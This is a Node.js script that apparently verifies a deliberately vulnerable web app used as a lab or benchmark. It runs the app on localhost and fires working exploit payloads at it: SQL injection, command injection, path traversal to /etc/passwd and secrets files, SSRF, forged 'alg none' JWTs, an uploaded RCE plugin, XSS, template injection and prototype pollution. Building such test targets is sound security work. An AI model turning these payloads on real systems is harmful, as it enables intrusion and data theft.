// Starts the app and proves every group A and group C flaw works. Also checks group B is unreachable.
// Usage: node scripts/verify.js   (uses a temp data dir and port 18080)
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const ROOT = path.join(__dirname, '..');
const PORT = 18080;
const BASE = `http://127.0.0.1:${PORT}`;
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vba-'));
const results = [];
const check = (id, ok, note = '') => { results.push({ id, ok }); console.log(`${ok ? 'PASS' : 'FAIL'} ${id} ${note}`); };
const get = async (p, o) => (await fetch(BASE + p, o)).text();
const j = (b) => ({ method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) });
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');

(async () => {
  const srv = spawn('node', ['src/server.js'], {
    cwd: ROOT,
    env: { ...process.env, PORT, DATA_DIR: path.join(tmp, 'data'), UPLOAD_DIR: path.join(tmp, 'up') },
    stdio: 'ignore',
  });
  await new Promise((r) => setTimeout(r, 1500));
  try {
    // ---- group A
    const a1 = JSON.parse(await get('/api/login', j({ username: "admin'--", password: 'x' })));
    check('A1', !!a1.token);
    check('A2', (await get("/api/products?q=" + encodeURIComponent("zzz' UNION SELECT id,username,password FROM users--"))).includes('admin'));
    check('A3', (await get('/api/lookup?host=' + encodeURIComponent('x;echo PWNED'))).includes('PWNED'));
    const secrets = await get('/api/files?name=../secrets.env');
    check('A4', secrets.includes('JWT_SECRET='));
    const key = (await (await fetch(BASE + '/api/system/info')).json()).internalKey;
    check('A8', !!key);
    const internal = (p) => get('/api/fetch?url=' + encodeURIComponent(`http://127.0.0.1:9091${p}&key=${key}`));
    check('A5', (await internal('/internal/users?x=1')).includes('admin'));
    check('A6', (await get('/api/calc?expr=' + encodeURIComponent('7*191'))).includes('1337'));
    const env = JSON.parse(await get('/api/debug/env', { headers: { authorization: 'Basic ' + Buffer.from('debug:debug').toString('base64') } }));
    check('A7', !!env.JWT_SECRET);
    const up = JSON.parse(await get('/api/upload?name=plugin.js', { method: 'POST', headers: { 'content-type': 'application/octet-stream' }, body: "require('fs').writeFileSync(process.env.UPLOAD_DIR+'/rce.txt','RCE');module.exports={ok:1}" }));
    check('A9', up.url === '/uploads/plugin.js' && (await get('/uploads/plugin.js')).includes('RCE'));
    const none = `${b64({ alg: 'none' })}.${b64({ sub: 'x', role: 'admin' })}.`;
    check('A10', (await get('/api/me', { headers: { authorization: 'Bearer ' + none } })).includes('admin'));

    // ---- group C (use the alg none token, so no secret is needed)
    const H = { authorization: 'Bearer ' + none, 'content-type': 'application/json' };
    check('C1', (await get('/api/admin/export?table=users', { headers: H })).includes('password'));
    check('C2', (await get('/api/admin/logs?file=../../../../../../../../../../../../etc/passwd', { headers: H })).includes('root:'));
    check('C3', (await get('/api/admin/report', { method: 'POST', headers: H, body: JSON.stringify({ template: '${7*191}' }) })).includes('1337'));
    await get('/api/admin/plugins/load?name=plugin.js', { method: 'POST', headers: H });
    check('C4', fs.existsSync(path.join(tmp, 'up', 'rce.txt')));
    await get('/api/login', j({ username: '<img src=x onerror=alert(1)>', password: 'x' }));
    check('C5', (await get('/api/admin/audit', { headers: H })).includes('<img src=x onerror=alert(1)>'));
    const dest = path.join(tmp, 'owned.json');
    await get('/api/admin/backup?dest=' + encodeURIComponent(dest), { method: 'POST', headers: H });
    check('C6', fs.existsSync(dest));
    check('C7', (await get('/api/admin/webhook?url=' + encodeURIComponent(`http://127.0.0.1:9091/internal/users?key=${key}`), { method: 'POST', headers: H })).includes('admin'));
    check('C8', (await internal('/internal/run?cmd=' + encodeURIComponent('echo CMDINJ'))).includes('CMDINJ'));
    check('C9', (await internal('/internal/users?x=2')).match(/[0-9a-f]{32}/) !== null);
    const st = JSON.parse(await get('/api/admin/settings', { method: 'POST', headers: H, body: '{"__proto__":{"isAdminEverywhere":true}}' }));
    check('C10', st.polluted === true);

    // ---- chain gate: group C must NOT work without an admin token
    const anon = await fetch(BASE + '/api/admin/export?table=users');
    check('C-gate', anon.status === 403, '(admin routes closed without a token)');
    const direct = await fetch(`http://127.0.0.1:9091/internal/users`).then((r) => r.status).catch(() => 0);
    check('C-internal-key', direct === 403, '(internal service needs the key)');
  } finally {
    srv.kill();
  }

  // ---- group B: static reachability. Walk require() from src/server.js and src/internal.js.
  const seen = new Set();
  const walk = (f) => {
    if (seen.has(f)) return;
    seen.add(f);
    const src = fs.readFileSync(f, 'utf8');
    for (const m of src.matchAll(/require\('(\.[^']+)'\)/g)) {
      let p = path.resolve(path.dirname(f), m[1]);
      if (!p.endsWith('.js')) p += '.js';
      if (fs.existsSync(p)) walk(p);
    }
  };
  walk(path.join(ROOT, 'src/server.js'));
  for (const f of fs.readdirSync(path.join(ROOT, 'src/dead'))) check('B-dead:' + f, !seen.has(path.join(ROOT, 'src/dead', f)));
  const all = fs.readdirSync(path.join(ROOT, 'src')).filter((f) => f.endsWith('.js')).map((f) => fs.readFileSync(path.join(ROOT, 'src', f), 'utf8')).join('\n');
  const code = all.replace(/\/\/.*$/gm, '');
  const calls = (name) => (code.match(new RegExp(name + '\\(', 'g')) || []).length - (code.match(new RegExp('function ' + name + '\\(', 'g')) || []).length;
  check('B7', calls('legacySearch') === 0, '(defined and exported, never called)');
  check('B8', calls('runDiagnostics') === 0, '(defined, never called)');
  check('B9', !/require\('lodash'\)|from 'lodash'/.test(all), '(lodash never imported)');

  const bad = results.filter((r) => !r.ok);
  console.log(`\n${results.length - bad.length}/${results.length} checks passed`);
  process.exit(bad.length ? 1 : 0);
})();
